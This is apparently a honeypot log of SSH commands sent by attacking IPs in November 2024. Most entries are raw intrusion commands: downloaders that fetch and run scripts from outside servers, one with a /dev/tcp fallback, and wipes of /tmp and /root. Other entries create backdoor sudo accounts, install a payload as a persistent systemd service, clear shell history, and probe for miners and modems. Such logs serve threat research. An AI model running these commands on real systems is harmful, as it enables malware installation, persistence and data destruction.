--- Start of remote_exec_dallas_07-10_12_24.log ---
start
2024-11-26 07:20:34.445349 - ('87.120.113.231', 45272) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 07:37:29.691110 - ('92.255.57.132', 57834) - echo 'SSH check'
2024-11-26 08:34:20.009670 - ('92.255.57.132', 54446) - echo 'SSH check'
2024-11-26 08:34:59.084232 - ('45.148.10.203', 49728) - apt
2024-11-26 08:34:59.621442 - ('45.148.10.203', 49728) - lscpu

2024-11-26 08:35:03.197684 - ('45.148.10.203', 38326) - apt
2024-11-26 08:35:03.737834 - ('45.148.10.203', 38326) - lscpu

2024-11-26 08:35:07.081700 - ('45.148.10.203', 38336) - apt
2024-11-26 08:35:07.617762 - ('45.148.10.203', 38336) - lscpu

2024-11-26 08:35:11.215355 - ('45.148.10.203', 37252) - apt
2024-11-26 08:35:11.753686 - ('45.148.10.203', 37252) - lscpu

2024-11-26 09:30:53.347694 - ('92.255.57.132', 50718) - echo 'SSH check'
2024-11-26 10:23:30.456399 - ('45.148.10.203', 33220) - apt
2024-11-26 10:23:30.977086 - ('45.148.10.203', 33220) - lscpu

2024-11-26 10:23:34.309536 - ('45.148.10.203', 33236) - apt
2024-11-26 10:23:34.807039 - ('45.148.10.203', 33236) - lscpu

2024-11-26 10:24:04.964320 - ('92.255.57.132', 45980) - echo 'SSH check'
2024-11-26 10:45:08.575577 - ('195.178.110.34', 50676) - apt
2024-11-26 10:45:09.040069 - ('195.178.110.34', 50676) - lscpu

2024-11-26 10:45:13.480712 - ('195.178.110.34', 38848) - apt
2024-11-26 10:45:14.139271 - ('195.178.110.34', 38848) - lscpu

2024-11-26 10:45:19.023316 - ('195.178.110.34', 55396) - apt
2024-11-26 10:45:19.619098 - ('195.178.110.34', 55396) - lscpu

2024-11-26 10:45:23.464730 - ('195.178.110.34', 49046) - apt
2024-11-26 10:45:24.108659 - ('195.178.110.34', 49046) - lscpu

2024-11-26 10:45:28.883071 - ('195.178.110.34', 33432) - apt
2024-11-26 10:45:29.539360 - ('195.178.110.34', 33432) - lscpu

2024-11-26 10:45:33.505519 - ('195.178.110.34', 50802) - apt
2024-11-26 10:45:34.095880 - ('195.178.110.34', 50802) - lscpu

2024-11-26 10:45:39.879750 - ('195.178.110.34', 40824) - apt
2024-11-26 10:45:40.678040 - ('195.178.110.34', 40824) - lscpu

2024-11-26 10:45:43.455958 - ('195.178.110.34', 60758) - apt
2024-11-26 10:45:44.007282 - ('195.178.110.34', 60758) - lscpu

2024-11-26 10:45:48.436259 - ('195.178.110.34', 48238) - apt
2024-11-26 10:45:49.293018 - ('195.178.110.34', 48238) - lscpu

2024-11-26 10:45:53.457934 - ('195.178.110.34', 36946) - apt
2024-11-26 10:45:54.013914 - ('195.178.110.34', 36946) - lscpu

2024-11-26 10:45:58.342386 - ('195.178.110.34', 53032) - apt
2024-11-26 10:45:58.884690 - ('195.178.110.34', 53032) - lscpu

2024-11-26 10:46:03.575423 - ('195.178.110.34', 42578) - apt
2024-11-26 10:46:04.056269 - ('195.178.110.34', 42578) - lscpu

2024-11-26 10:46:08.676209 - ('195.178.110.34', 59626) - apt
2024-11-26 10:46:09.209015 - ('195.178.110.34', 59626) - lscpu

2024-11-26 10:46:13.675917 - ('195.178.110.34', 49826) - apt
2024-11-26 10:46:14.416605 - ('195.178.110.34', 49826) - lscpu

2024-11-26 11:20:40.149105 - ('92.255.57.132', 50890) - echo 'SSH check'
2024-11-26 12:17:18.361557 - ('92.255.57.132', 37466) - echo 'SSH check'
2024-11-26 13:14:32.477456 - ('92.255.57.132', 60982) - echo 'SSH check'
2024-11-26 14:11:48.363406 - ('92.255.57.132', 43598) - echo 'SSH check'
2024-11-26 14:48:18.624144 - ('87.120.113.231', 56240) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 15:09:13.345916 - ('92.255.57.132', 48308) - echo 'SSH check'
2024-11-26 15:17:22.534874 - ('46.19.143.66', 49472) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 XxdzM4nj) system && sudo usermod -aG sudo system
2024-11-26 15:17:23.045486 - ('46.19.143.66', 49472) - lscpu && echo -e "XxdzM4nj\nXxdzM4nj" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-26 15:44:26.400819 - ('37.44.238.68', 36544) - whoami
2024-11-26 15:44:28.209884 - ('37.44.238.68', 36562) - whoami
2024-11-26 15:44:30.752668 - ('37.44.238.68', 36592) - whoami
2024-11-26 15:44:31.581473 - ('37.44.238.68', 36590) - whoami
2024-11-26 15:44:34.455160 - ('37.44.238.68', 36620) - whoami
2024-11-26 15:44:36.994973 - ('37.44.238.68', 36552) - whoami
2024-11-26 15:44:38.848449 - ('37.44.238.68', 36576) - whoami
2024-11-26 15:44:41.917138 - ('37.44.238.68', 36608) - whoami
2024-11-26 15:44:43.997177 - ('37.44.238.68', 41048) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-26 15:44:46.224192 - ('37.44.238.68', 41064) - whoami
2024-11-26 15:44:47.677099 - ('37.44.238.68', 41068) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-26 15:44:50.229765 - ('37.44.238.68', 41082) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-26 15:44:52.498453 - ('37.44.238.68', 41094) - whoami
2024-11-26 15:44:56.027982 - ('37.44.238.68', 41104) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-26 15:44:57.209112 - ('37.44.238.68', 41106) - whoami
2024-11-26 16:06:12.045379 - ('92.255.57.132', 52692) - echo 'SSH check'
2024-11-26 16:10:53.268003 - ('87.120.113.231', 34018) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 16:15:22.013373 - ('87.120.113.231', 56392) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 17:00:38.809131 - ('218.92.0.132', 34036) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-26 17:00:45.953125 - ('218.92.0.132', 34036) - ls -la /var/run/gcc.pid
2024-11-26 17:25:15.898941 - ('38.191.248.41', 58906) - /ip cloud print
2024-11-26 17:25:17.330069 - ('38.191.248.41', 58906) - ifconfig
2024-11-26 17:25:18.258719 - ('38.191.248.41', 58906) - uname -a
2024-11-26 17:25:19.598825 - ('38.191.248.41', 58906) - cat /proc/cpuinfo
2024-11-26 17:25:20.519149 - ('38.191.248.41', 58906) - ps | grep '[Mm]iner'
2024-11-26 17:25:21.440107 - ('38.191.248.41', 58906) - ps -ef | grep '[Mm]iner'
2024-11-26 17:25:22.370143 - ('38.191.248.41', 58906) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-26 17:25:23.305096 - ('38.191.248.41', 58906) - echo Hi | cat -n
2024-11-26 17:38:57.328134 - ('87.120.113.231', 34564) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 18:00:20.249125 - ('92.255.57.132', 55412) - echo 'SSH check'
2024-11-26 18:57:22.924861 - ('92.255.57.132', 49620) - echo 'SSH check'
2024-11-26 19:54:55.177292 - ('92.255.57.132', 39604) - echo 'SSH check'
2024-11-26 20:51:49.446081 - ('92.255.57.132', 50850) - echo 'SSH check'
2024-11-26 21:48:26.905708 - ('92.255.57.132', 59324) - echo 'SSH check'
2024-11-26 22:45:19.626638 - ('92.255.57.132', 34622) - echo 'SSH check'
2024-11-26 22:56:17.655055 - ('46.19.143.66', 37834) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 eS34qs48) system && sudo usermod -aG sudo system
2024-11-26 22:56:18.385226 - ('46.19.143.66', 37834) - lscpu && echo -e "eS34qs48\neS34qs48" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-26 23:42:41.270367 - ('92.255.57.132', 54970) - echo 'SSH check'
2024-11-27 00:39:34.393778 - ('92.255.57.132', 55268) - echo 'SSH check'
2024-11-27 01:21:02.040177 - ('87.120.113.231', 46640) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-27 01:36:43.014692 - ('92.255.57.132', 48936) - echo 'SSH check'
2024-11-27 02:34:21.476828 - ('92.255.57.132', 54640) - echo 'SSH check'
2024-11-27 03:31:09.794188 - ('92.255.57.132', 46158) - echo 'SSH check'
2024-11-27 03:34:34.578823 - ('46.19.143.66', 41058) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QQz7uFGG) system && sudo usermod -aG sudo system
2024-11-27 03:34:35.197656 - ('46.19.143.66', 41058) - lscpu && echo -e "QQz7uFGG\nQQz7uFGG" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-27 04:08:51.670709 - ('157.10.217.190', 54606) - scp -t -- /tmp/WDyRyQxR
2024-11-27 04:08:52.844418 - ('157.10.217.190', 54622) - scp -t -- /tmp/WDyRyQxR
2024-11-27 05:25:57.066964 - ('92.255.57.132', 37136) - echo 'SSH check'
2024-11-27 06:22:58.363564 - ('92.255.57.132', 53528) - echo 'SSH check'
2024-11-27 06:53:41.598456 - ('218.92.0.132', 50832) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-27 06:53:43.067848 - ('218.92.0.132', 50832) - ls -la /var/run/gcc.pid
2024-11-27 07:20:27.662045 - ('92.255.57.132', 49558) - echo 'SSH check'
2024-11-27 08:18:20.562310 - ('92.255.57.132', 59242) - echo 'SSH check'
2024-11-27 08:58:02.844972 - ('195.178.110.6', 39662) - apt
2024-11-27 08:58:03.844326 - ('195.178.110.6', 39662) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 08:58:24.144180 - ('195.178.110.6', 37388) - apt
2024-11-27 08:58:24.941206 - ('195.178.110.6', 37388) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 08:58:45.466011 - ('195.178.110.6', 53620) - apt
2024-11-27 08:58:46.252680 - ('195.178.110.6', 53620) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 08:59:07.044880 - ('195.178.110.6', 55546) - apt
2024-11-27 08:59:07.843377 - ('195.178.110.6', 55546) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 08:59:28.974186 - ('195.178.110.6', 48138) - apt
2024-11-27 08:59:30.240908 - ('195.178.110.6', 48138) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 08:59:50.644499 - ('195.178.110.6', 37966) - apt
2024-11-27 08:59:51.344881 - ('195.178.110.6', 37966) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:00:12.368791 - ('195.178.110.6', 32842) - apt
2024-11-27 09:00:13.372865 - ('195.178.110.6', 32842) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:00:33.645793 - ('195.178.110.6', 35072) - apt
2024-11-27 09:00:34.844139 - ('195.178.110.6', 35072) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:00:55.141563 - ('195.178.110.6', 48088) - apt
2024-11-27 09:00:56.651252 - ('195.178.110.6', 48088) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:01:18.242794 - ('195.178.110.6', 40068) - apt
2024-11-27 09:01:20.140265 - ('195.178.110.6', 40068) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:01:41.840688 - ('195.178.110.6', 54564) - apt
2024-11-27 09:01:43.042005 - ('195.178.110.6', 54564) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:02:04.444069 - ('195.178.110.6', 36314) - apt
2024-11-27 09:02:05.843041 - ('195.178.110.6', 36314) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:02:27.342193 - ('195.178.110.6', 50580) - apt
2024-11-27 09:02:28.444534 - ('195.178.110.6', 50580) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:02:50.041408 - ('195.178.110.6', 43302) - apt
2024-11-27 09:02:50.672841 - ('195.178.110.6', 43302) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:03:10.841858 - ('195.178.110.6', 51596) - apt
2024-11-27 09:03:11.440840 - ('195.178.110.6', 51596) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:03:31.247196 - ('195.178.110.6', 35418) - apt
2024-11-27 09:03:32.488022 - ('195.178.110.6', 35418) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:03:52.442060 - ('195.178.110.6', 49682) - apt
2024-11-27 09:03:54.706526 - ('195.178.110.6', 49682) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:04:16.049726 - ('195.178.110.6', 35616) - apt
2024-11-27 09:04:16.945317 - ('195.178.110.6', 35616) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:04:37.748133 - ('195.178.110.6', 49352) - apt
2024-11-27 09:04:39.442416 - ('195.178.110.6', 49352) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:05:00.912707 - ('195.178.110.6', 48688) - apt
2024-11-27 09:05:02.762712 - ('195.178.110.6', 48688) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-27 09:05:23.759501 - ('195.178.110.6', 35728) - apt
2024-11-27 09:05:24.741084 - ('195.178.110.6', 35728) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
